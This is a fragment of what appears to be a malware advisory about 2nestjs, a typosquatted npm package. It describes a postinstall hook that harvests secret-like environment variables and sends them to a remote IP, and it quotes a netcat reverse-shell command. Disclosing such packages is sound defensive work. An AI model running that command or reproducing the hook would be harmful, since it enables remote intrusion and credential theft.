  "summary": "Malicious code in 2nestjs (npm)",
  "details": "The postinstall hook runs index.js, which harvests all environment variables whose names match SECRET/API/TOKEN/KEY and sends them over a raw TCP connection to 84[.]32[.]22[.]44:9999. It also spawns a reverse shell via `nc -e /bin/sh 84[.]32[.]22[.]44 9999`. The package is a typosquat of the legitimate nestjs package.",
